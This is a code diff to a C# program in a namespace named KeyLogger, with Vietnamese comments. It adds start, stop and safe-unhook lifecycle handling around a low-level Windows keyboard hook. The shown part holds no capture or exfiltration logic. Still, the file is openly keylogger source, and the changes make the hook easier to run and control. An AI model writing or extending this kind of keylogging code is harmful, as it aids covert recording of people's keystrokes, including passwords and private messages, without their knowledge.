@@ -59,6 +59,7 @@ namespace KeyLogger
 
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
+        private static volatile bool _isRunning = false;  // Flag để kiểm tra trạng thái
 
         // ==================== DELEGATE ====================
 
@@ -69,9 +70,35 @@ namespace KeyLogger
         // Hàm khởi động Keylogger
         public static void startKLog()
         {
+            _isRunning = true;
             _hookID = SetHook(_proc);
             Application.Run(); // Giữ luồng sống
-            UnhookWindowsHookEx(_hookID);
+            // Cleanup khi thoát (Thread.Abort hoặc Application exit)
+            SafeUnhook();
+        }
+        
+        // Hàm dừng Keylogger an toàn
+        public static void stopKLog()
+        {
+            _isRunning = false;
+            SafeUnhook();
+            Application.ExitThread();  // Thoát Application.Run()
+        }
+        
+        // Helper: Gỡ hook an toàn
+        private static void SafeUnhook()
+        {
+            if (_hookID != IntPtr.Zero)
+            {
+                UnhookWindowsHookEx(_hookID);
+                _hookID = IntPtr.Zero;
+            }
+        }
+        
+        // Kiểm tra trạng thái keylogger
+        public static bool IsRunning()
+        {
+            return _isRunning && _hookID != IntPtr.Zero;
         }
 
         // ==================== PRIVATE METHODS ====================
